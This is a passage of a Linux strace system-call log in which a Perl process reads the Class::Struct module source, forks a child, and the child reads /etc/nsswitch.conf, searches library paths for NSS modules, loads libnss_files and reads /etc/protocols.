 croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
7444  07:18:47.778741 _llseek(10, 6916, [6916], SEEK_SET) = 0
7444  07:18:47.778751 _llseek(10, 0, [6916], SEEK_CUR) = 0
7444  07:18:47.778751 close(10)         = 0
7444  07:18:47.778751 _llseek(8, 1334, [1334], SEEK_SET) = 0
7444  07:18:47.778751 _llseek(8, 0, [1334], SEEK_CUR) = 0
7444  07:18:47.778751 close(8)          = 0
7444  07:18:47.779305 brk(0x82ff000)    = 0x82ff000
7444  07:18:47.779502 _llseek(6, 2689, [2689], SEEK_SET) = 0
7444  07:18:47.779532 _llseek(6, 0, [2689], SEEK_CUR) = 0
7444  07:18:47.779542 close(6)          = 0
7444  07:18:47.779681 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e0a908) = 7445
7445  07:18:47.814875 getppid()         = 7444
7445  07:18:47.815436 open("/etc/nsswitch.conf", O_RDONLY) = 6
7445  07:18:47.815462 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
7445  07:18:47.815482 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd0000
7445  07:18:47.815496 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
7445  07:18:47.815545 read(6, "", 4096) = 0
7445  07:18:47.815556 close(6)          = 0
7445  07:18:47.815566 munmap(0xb7fd0000, 4096) = 0
7445  07:18:47.815593 open("/etc/ld.so.cache", O_RDONLY) = 6
7445  07:18:47.815607 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7445  07:18:47.815623 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7dd7000
7445  07:18:47.815634 close(6)          = 0
7445  07:18:47.815645 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7445  07:18:47.815663 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815677 stat64("/lib/tls/i686/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.815690 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815704 stat64("/lib/tls/i686/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.815715 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815728 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7445  07:18:47.815745 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815757 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7445  07:18:47.815783 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815838 stat64("/lib/tls/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.815850 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815879 stat64("/lib/tls/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.815903 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815915 stat64("/lib/tls/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.815926 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815937 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7445  07:18:47.815954 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815966 stat64("/lib/i686/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.815983 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.815995 stat64("/lib/i686/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816006 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816018 stat64("/lib/i686/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816028 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816040 stat64("/lib/i686", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816050 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816062 stat64("/lib/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816073 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816084 stat64("/lib/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816094 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816106 stat64("/lib/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816116 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816127 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7445  07:18:47.816144 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816156 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816168 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816180 stat64("/usr/lib/tls/i686/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816191 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816203 stat64("/usr/lib/tls/i686/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816215 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816226 stat64("/usr/lib/tls/i686", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816237 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816249 stat64("/usr/lib/tls/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816261 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816281 stat64("/usr/lib/tls/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816320 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816333 stat64("/usr/lib/tls/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816361 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816372 stat64("/usr/lib/tls", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816383 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816396 stat64("/usr/lib/i686/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816407 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816419 stat64("/usr/lib/i686/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816430 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816442 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7445  07:18:47.816459 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816471 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7445  07:18:47.816488 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816503 stat64("/usr/lib/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816514 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816526 stat64("/usr/lib/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816537 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816548 stat64("/usr/lib/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816559 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816570 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
7445  07:18:47.816586 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816600 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816612 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816625 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816637 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816650 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816662 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816675 stat64("/lib/i486-linux-gnu/tls/i686", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816686 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816699 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816711 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816724 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816735 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816747 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816759 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816779 stat64("/lib/i486-linux-gnu/tls", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816818 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816831 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816860 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816873 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816885 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816897 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816909 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816922 stat64("/lib/i486-linux-gnu/i686", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816933 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816946 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816957 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816970 stat64("/lib/i486-linux-gnu/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.816984 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.816996 stat64("/lib/i486-linux-gnu/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817008 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817020 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7445  07:18:47.817037 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817051 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817064 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817077 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817090 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817103 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817115 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817128 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817140 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817153 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817165 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817178 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817190 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817203 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817214 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817227 stat64("/usr/lib/i486-linux-gnu/tls", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817238 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817252 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817264 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817286 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817325 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817353 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817365 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817378 stat64("/usr/lib/i486-linux-gnu/i686", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817390 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817404 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817430 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817442 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817454 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817466 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbff5d3fc) = -1 ENOENT (No such file or directory)
7445  07:18:47.817481 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7445  07:18:47.817494 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7445  07:18:47.817514 munmap(0xb7dd7000, 29913) = 0
7445  07:18:47.817535 open("/etc/ld.so.cache", O_RDONLY) = 6
7445  07:18:47.817547 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7445  07:18:47.817563 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7dd7000
7445  07:18:47.817574 close(6)          = 0
7445  07:18:47.817584 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7445  07:18:47.817598 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
7445  07:18:47.817613 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7445  07:18:47.817703 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
7445  07:18:47.817723 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7dcc000
7445  07:18:47.817735 mmap2(0xb7dd5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7dd5000
7445  07:18:47.817752 close(6)          = 0
7445  07:18:47.817784 munmap(0xb7dd7000, 29913) = 0
7445  07:18:47.817857 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
7445  07:18:47.817874 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
7445  07:18:47.817893 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
7445  07:18:47.817909 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dde000
7445  07:18:47.817920 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
7445  07:18:47.818104 close(6)          = 0
7445  07:18:47.818114 munmap(0xb7dde000, 4096) = 0
7445  07:18:47.818133 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
7445  07:18:47.818146 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
7445  07:18:47.818162 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dde000
7445  07:18:47.818173 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header 